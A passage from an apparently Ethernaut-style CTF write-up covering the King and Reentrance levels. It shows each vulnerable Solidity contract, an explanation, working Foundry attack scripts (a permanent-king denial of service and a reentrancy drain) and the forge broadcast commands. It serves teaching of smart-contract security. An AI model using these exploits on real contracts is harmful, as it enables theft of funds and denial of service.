<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">King</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">address</span><span> king</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint</span><span> </span><span class="token" style="color:#569CD6">public</span><span> prize</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    king </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    prize </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>value</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#dcdcaa">receive</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>value </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> prize </span><span class="token" style="color:#d4d4d4">||</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">==</span><span> owner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span>king</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    king </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    prize </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>value</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">_king</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> king</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>Be the <code>King</code> and make others dont claim the <code>King</code> position again.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>Initially check the <code>prize</code> amount that need to send to be the king. And send the <code>prize</code> amount to the <code>King</code> contract.</li>
<li>When someone send the <code>prize</code> amount back to us to claim the king position, we can deny the money.</li>
<li>So, that they wont be the king anymore.</li>
<li>In order to deny the prize, we can write a contract which sends prize to the king contract and dont implement any <code>receive()/fallback()</code> function.</li>
<li>This will revert others transaction when they sends prize to us, So, we will remain as the king.</li>
</ol>
<p><strong>Level9Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level9.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span>King _kingInstance</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>_kingInstance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>call</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span>_kingInstance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">prize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span class="token" style="color:#6a9955">//calling the receiver function in King contract</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#6a9955">//since there is no fallback or receive function in this contract ,we can successfully denied the money</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level9Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    King </span><span class="token" style="color:#569CD6">public</span><span> kingInstance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">King</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xb6Db4938daB72C9e2DF8a19eE5846D2692872441</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;first King is :&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>kingInstance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">_king</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;first prize is:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>kingInstance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">prize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span>kingInstance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">prize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span>kingInstance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;second King is :&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>kingInstance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">_king</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;second prize is:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>kingInstance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">prize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level9Solution.s.sol:Level9Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Reentrancy</h2>
<p><strong>Level10.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.6.12</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Reentrance</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">using</span><span> </span><span class="token" style="color:#4ec9b0">SafeMath</span><span> </span><span class="token" style="color:#569CD6">for</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">mapping</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#d4d4d4">=&gt;</span><span> </span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> balances</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">donate</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _to</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    balances</span><span class="token" style="color:#d4d4d4">[</span><span>_to</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> balances</span><span class="token" style="color:#d4d4d4">[</span><span>_to</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">add</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>value</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _who</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> balance</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> balances</span><span class="token" style="color:#d4d4d4">[</span><span>_who</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">withdraw</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span> _amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">if</span><span class="token" style="color:#d4d4d4">(</span><span>balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> _amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span> result</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">.</span><span>call</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span>_amount</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">if</span><span class="token" style="color:#d4d4d4">(</span><span>result</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        _amount</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>      balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">-=</span><span> _amount</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#dcdcaa">receive</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>Drain all the ether of the Reentrance contract.</p>
<p><strong>Explanation</strong>:</p>
<ol>
<li>The <code>withdraw()</code> function is vulnerable to <code>Reentrancy</code>, as it is updating the user balance after the external call.</li>
<li>One could deposit some ether to pass the require check in withdraw and and call the withdraw from a contract in which a fallback function is implemented in such a way that it is re entered into withdraw again.</li>
<li>So, we will donate some ether to the contract and then call withdraw from a contract.</li>
<li>The withdraw call send our ether back and invokes the fallback or receive function of our contract.</li>
<li>We can call the <code>withdraw()</code> function again from the fallback function to reenter again into <code>Reentrance</code> contract.</li>
<li>Still we can manage to pass require check as our balance wasn’t updated yet.</li>
<li>We need to check the balance of the <code>Reentrance</code> contract before reentering because when we call the withdraw again after the balance of <code>Reentrance</code> becomes zero will revert the entire transaction.</li>
</ol>
<p><strong>Level10Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.6.12</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level10.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    Reentrance </span><span class="token" style="color:#569CD6">public</span><span> r_instance </span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#dcdcaa">Reentrance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x1e5f76396a5b433c9c462c919dAf64Eed6bD4926</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>        r_instance</span><span class="token" style="color:#d4d4d4">.</span><span>donate</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">0.001</span><span> ether</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        r_instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">withdraw</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0.001</span><span> ether</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">receive</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>r_instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>balance </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> </span><span class="token" style="color:#b5cea8">0.001</span><span> ether</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>             r_instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">withdraw</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0.001</span><span> ether</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level10Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>exploit</span><span class="token" style="color:#d4d4d4">{</span><span>value</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#b5cea8">0.001</span><span> ether</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level10Solution.s.sol:Level10Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Elevator</h2>
<p><strong>Level11.sol</strong></p>
